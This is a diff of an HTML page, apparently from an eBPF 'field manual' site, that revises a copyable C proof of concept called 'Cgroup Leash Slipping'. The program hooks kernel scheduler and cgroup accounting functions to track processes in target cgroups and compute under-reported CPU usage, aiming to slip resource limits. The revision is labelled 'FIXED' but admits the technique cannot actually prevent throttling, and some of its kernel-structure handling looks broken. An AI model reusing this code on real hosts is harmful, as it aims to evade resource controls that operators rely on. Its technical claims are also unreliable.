@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -619,6 +626,31 @@ graph TD
 259
 260
 261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Cgroup Leash Slipping - eBPF exploitation proof of concept</span>
@@ -686,13 +718,18 @@ graph TD
     <span class="kt">char</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
 <span class="p">};</span>
 
-<span class="c1">// Helper function to check if a cgroup is our target</span>
+<span class="c1">// FIXED: Helper function to check if a cgroup is our target</span>
 <span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_target_cgroup</span><span class="p">(</span><span class="k">struct</span> <span class="n">cgroup</span> <span class="o">*</span><span class="n">cgrp</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="n">u64</span> <span class="n">cgroup_id</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">cgroup_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     
-    <span class="c1">// Get the cgroup ID</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cgroup_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cgroup_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
+    <span class="c1">// FIXED: Get the cgroup ID safely</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">cgrp</span> <span class="o">&amp;&amp;</span> <span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cgroup_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cgroup_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// Fallback: use a hash of the cgroup pointer</span>
+        <span class="n">cgroup_id</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">cgrp</span><span class="p">;</span>
+    <span class="p">}</span>
     
     <span class="c1">// Check if this is one of our target cgroups</span>
     <span class="n">u8</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_cgroups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cgroup_id</span><span class="p">);</span>
@@ -741,64 +778,71 @@ graph TD
     <span class="p">}</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the cgroup CPU accounting function</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/cgroup_account_cputime"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_cgroup_account</span><span class="p">,</span> <span class="k">struct</span> <span class="n">cgroup</span> <span class="o">*</span><span class="n">cgrp</span><span class="p">,</span> <span class="n">u64</span> <span class="n">cputime</span><span class="p">)</span>
+<span class="c1">// FIXED: Hook the cgroup CPU accounting function (using a more reliable hook point)</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/account_group_exec_runtime"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_cgroup_account</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">tsk</span><span class="p">,</span> <span class="n">u64</span> <span class="n">runtime</span><span class="p">)</span>
 <span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Get the task's cgroup</span>
+    <span class="k">struct</span> <span class="n">cgroup</span> <span class="o">*</span><span class="n">cgrp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cgrp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cgrp</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">tsk</span><span class="o">-&gt;</span><span class="n">cgroups</span><span class="p">);</span>
+    
     <span class="c1">// Check if this is our target cgroup</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_cgroup</span><span class="p">(</span><span class="n">cgrp</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Get process information</span>
-        <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
-        
+    <span class="k">if</span> <span class="p">(</span><span class="n">cgrp</span> <span class="o">&amp;&amp;</span> <span class="n">is_target_cgroup</span><span class="p">(</span><span class="n">cgrp</span><span class="p">))</span> <span class="p">{</span>
         <span class="c1">// Add this process to our tracking map</span>
         <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
         <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
         
-        <span class="c1">// Calculate the reduced cputime to report</span>
-        <span class="n">u64</span> <span class="n">reduced_cputime</span> <span class="o">=</span> <span class="n">cputime</span> <span class="o">/</span> <span class="n">USAGE_DIVISOR</span><span class="p">;</span>
+        <span class="c1">// Calculate the reduced runtime to report</span>
+        <span class="n">u64</span> <span class="n">reduced_runtime</span> <span class="o">=</span> <span class="n">runtime</span> <span class="o">/</span> <span class="n">USAGE_DIVISOR</span><span class="p">;</span>
         
         <span class="c1">// Update our statistics</span>
-        <span class="n">update_cpu_stats</span><span class="p">(</span><span class="n">cputime</span><span class="p">,</span> <span class="n">reduced_cputime</span><span class="p">);</span>
+        <span class="n">update_cpu_stats</span><span class="p">(</span><span class="n">runtime</span><span class="p">,</span> <span class="n">reduced_runtime</span><span class="p">);</span>
         
         <span class="c1">// Log the event</span>
         <span class="k">struct</span> <span class="n">log_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
         <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
-        <span class="n">event</span><span class="p">.</span><span class="n">original_usage</span> <span class="o">=</span> <span class="n">cputime</span><span class="p">;</span>
-        <span class="n">event</span><span class="p">.</span><span class="n">reported_usage</span> <span class="o">=</span> <span class="n">reduced_cputime</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">original_usage</span> <span class="o">=</span> <span class="n">runtime</span><span class="p">;</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">reported_usage</span> <span class="o">=</span> <span class="n">reduced_runtime</span><span class="p">;</span>
         <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
         <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
         
         <span class="c1">// Send event to user space</span>
         <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
-        
-        <span class="c1">// Modify the cputime parameter</span>
-        <span class="c1">// Note: In a real exploit, this would use bpf_probe_write_user() or similar</span>
-        <span class="c1">// to modify the actual parameter, but this is simplified for demonstration</span>
-        
-        <span class="c1">// Return early to prevent the original accounting</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
     <span class="p">}</span>
     
-    <span class="c1">// Let the original function run for other cgroups</span>
+    <span class="c1">// Let the original function run</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the scheduler's task accounting function</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/__update_curr"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_update_curr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">rq</span> <span class="o">*</span><span class="n">rq</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">curr</span><span class="p">,</span> <span class="n">bool</span> <span class="n">update_freq</span><span class="p">)</span>
+<span class="c1">// FIXED: Hook the scheduler's task accounting function</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/update_curr"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_update_curr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">cfs_rq</span> <span class="o">*</span><span class="n">cfs_rq</span><span class="p">)</span>
 <span class="p">{</span>
+    <span class="c1">// Get the current task</span>
+    <span class="k">struct</span> <span class="n">sched_entity</span> <span class="o">*</span><span class="n">curr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">curr</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cfs_rq</span><span class="o">-&gt;</span><span class="n">curr</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">curr</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="c1">// Get the task_struct from sched_entity</span>
+    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span> <span class="o">=</span> <span class="n">container_of</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">se</span><span class="p">);</span>
+    
     <span class="c1">// Get process information</span>
-    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
     
     <span class="c1">// Check if this is a process in our target cgroup</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// In a real exploit, we would modify the runtime accounting here</span>
-        <span class="c1">// This is a simplified version for demonstration</span>
-        
         <span class="c1">// Get the current runtime</span>
-        <span class="n">u64</span> <span class="n">runtime</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">runtime</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">runtime</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">se</span><span class="p">.</span><span class="n">sum_exec_runtime</span><span class="p">);</span>
+        <span class="n">u64</span> <span class="n">runtime</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">runtime</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">runtime</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">sum_exec_runtime</span><span class="p">);</span>
         
         <span class="c1">// Calculate the reduced runtime to report</span>
         <span class="n">u64</span> <span class="n">reduced_runtime</span> <span class="o">=</span> <span class="n">runtime</span> <span class="o">/</span> <span class="n">USAGE_DIVISOR</span><span class="p">;</span>
@@ -822,30 +866,43 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the cgroup throttling function</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/cgroup_throttle_cpu"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_throttle</span><span class="p">,</span> <span class="k">struct</span> <span class="n">cgroup</span> <span class="o">*</span><span class="n">cgrp</span><span class="p">)</span>
+<span class="c1">// FIXED: Hook the cgroup throttling function (using a more reliable hook point)</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/throttle_cfs_rq"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_throttle</span><span class="p">,</span> <span class="k">struct</span> <span class="n">cfs_rq</span> <span class="o">*</span><span class="n">cfs_rq</span><span class="p">)</span>
 <span class="p">{</span>
+    <span class="c1">// Get the task group from cfs_rq</span>
+    <span class="k">struct</span> <span class="n">task_group</span> <span class="o">*</span><span class="n">tg</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">tg</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cfs_rq</span><span class="o">-&gt;</span><span class="n">tg</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tg</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="c1">// Get the cgroup from task group</span>
+    <span class="k">struct</span> <span class="n">cgroup</span> <span class="o">*</span><span class="n">cgrp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cgrp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cgrp</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">tg</span><span class="o">-&gt;</span><span class="n">css</span><span class="p">.</span><span class="n">cgroup</span><span class="p">);</span>
+    
     <span class="c1">// Check if this is our target cgroup</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_cgroup</span><span class="p">(</span><span class="n">cgrp</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">cgrp</span> <span class="o">&amp;&amp;</span> <span class="n">is_target_cgroup</span><span class="p">(</span><span class="n">cgrp</span><span class="p">))</span> <span class="p">{</span>
         <span class="c1">// Get process information</span>
         <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
         
         <span class="c1">// Log the throttling attempt</span>
         <span class="k">struct</span> <span class="n">log_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
         <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">cgroup_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cgrp</span><span class="o">-&gt;</span><span class="n">kn</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
+        <span class="p">}</span>
         <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
         <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
         
         <span class="c1">// Send event to user space</span>
         <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
         
-        <span class="c1">// Prevent throttling by returning early</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="c1">// Note: We can't prevent throttling by returning early in kprobe</span>
+        <span class="c1">// A real exploit would need to use different techniques</span>
     <span class="p">}</span>
     
-    <span class="c1">// Let the original function run for other cgroups</span>
+    <span class="c1">// Let the original function run</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
@@ -855,11 +912,11 @@ graph TD
 <span class="p">{</span>
     <span class="c1">// Get the current task</span>
     <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">curr</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">curr</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">rq</span><span class="o">-&gt;</span><span class="n">curr</span><span class="p">);</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">curr</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">rq</span><span class="o">-&gt;</span><span class="n">curr</span><span class="p">);</span>
     
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
     
     <span class="c1">// Check if this is a process in our target cgroup</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
@@ -868,7 +925,7 @@ graph TD
         
         <span class="c1">// Get the current runtime</span>
         <span class="n">u64</span> <span class="n">delta_exec</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">delta_exec</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">delta_exec</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">se</span><span class="p">.</span><span class="n">sum_exec_runtime</span><span class="p">);</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">delta_exec</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">delta_exec</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">se</span><span class="p">.</span><span class="n">sum_exec_runtime</span><span class="p">);</span>
         
         <span class="c1">// Calculate the reduced delta to report</span>
         <span class="n">u64</span> <span class="n">reduced_delta</span> <span class="o">=</span> <span class="n">delta_exec</span> <span class="o">/</span> <span class="n">USAGE_DIVISOR</span><span class="p">;</span>
